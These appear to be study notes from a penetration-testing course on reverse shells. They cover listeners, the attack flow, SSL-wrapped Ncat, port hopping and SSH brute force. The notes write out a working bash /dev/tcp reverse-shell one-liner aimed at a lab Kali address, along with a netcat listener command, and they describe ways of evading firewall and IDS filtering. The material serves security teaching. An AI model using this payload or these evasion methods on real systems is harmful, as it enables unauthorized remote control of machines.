
# How Reverse Shells Work

A _reverse shell_ is a remote shell session where the _target_ machine opens an outbound network connection back to a _controller_ (attacker or admin), and the controller uses that connection to run commands on the target.

**How it works (conceptually):**
1. The controller runs a _listener_ (waits for an incoming connection).
2. The target — instead of the controller connecting to it — initiates an outbound connection to the listener.
3. Once the connection is established, the target’s command interpreter (shell) is piped over that connection, giving the controller interactive access.

**Reverse**
The term _reverse_ refers to the direction of the initial network traffic.
In a traditional shell or command execution flow, the attacker’s machine would typically be the one to connect to the compromised system to issue commands and control it.

**Ingress controls** protections that limit or inspect _incoming_ traffic into your network (e.g., perimeter firewalls, external-facing IDS/IPS, WAFs, VPN concentrators).
    
**Egress controls**: protections that limit or inspect _outbound_ traffic leaving your network (e.g., outbound firewall rules, secure web proxies, DNS controls, NGFW egress rules, gateway TLS inspection).

However, firewalls and network security devices are often configured to allow the outbound (egress) connections necessary for performing normal internet activity. 

When establishing a reverse shell, the compromised system initiates an egress connection to the attacker’s machine that is usually allowed by default. 

The firewall may perceive this egress connection as a

----

# Shell Payloads and Listeners

You’ll need two tools to set up a reverse shell: a payload and a listener.
The payload runs on the target machine.

A shell listener is a program that runs on the attacker machine to receive incoming reverse shell connections from compromised target systems.

One of the most popular shell listeners used in penetration tests is
Netcat.
Alternative tools such as Socket Cat (`socat`) and `pwncat`.

![[7. Reverse shells 2025-09-24 12.49.48.excalidraw]]

1. **Setting up a shell listener**: The attacker machine initializes a shell listener running on a specific port that is accessible from the internet.
2. **Exploiting the target server**.
3. **Uploading a reverse shell payload**: The attacker crafts a reverse shell payload and delivers it by exploiting the underlying vulnerability in the target system.
4. **Executing the payload**: The payload is executed on the target server.
5. **Requesting a reverse connection**: The payload attempts to connect to the attacker’s machine, acting as the client.
6. **Accepting the shell connection**: The listener receives the incoming connection and establishes a bidirectional communication channel with the target machine over the network.
7. **Executing commands and gaining server control**.

# Setting Up a Netcat Listener
```sh
nc -l -p 1337 -vv
```

# Crafting a Payload
```sh
bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
```
`-i` option makes the bash shell interactive, allowing it to receive
input and produce output.
 `/dev/tcp` path is a special pseudo-device file in Linux that provides access to TCP sockets.
`/dev/tcp/172.16.10.1/1337` We add to the `filepath` the IP address of the Kali machine and the port on which the Kali shell is waiting for incoming connections.
`bash -c` 
+ To wrap the entire payload in single quotes.
+ This specialized wrapping allows us to explicitly invoke a new instance of the bash shell while specifying a command string to execute with the `-c` option.

# Encrypting and Encapsulating Traffic
One way is by using `Ncat`
```sh
ncat -v -l 9443 --ssl
```
`--ssl` For Secure Sockets Layer (SSL)
`-v` verbose
`-l` listen

# Alternating Between Destination Ports
Port hopping, or dynamically switching network ports during the communication process, is used for both defensive and offensive activities.

By constantly changing ports, attackers can bypass simple port-based filtering mechanisms and intrusion detection systems that monitor specific ports for suspicious activities.


# Initial Access with Brute Force

**One common service to target is SSH**.
While generally considered a secure protocol, SSH implementations may have security weaknesses that attackers could exploit, such as poor or reused passwords, insecure authentication methods, and key management issues.



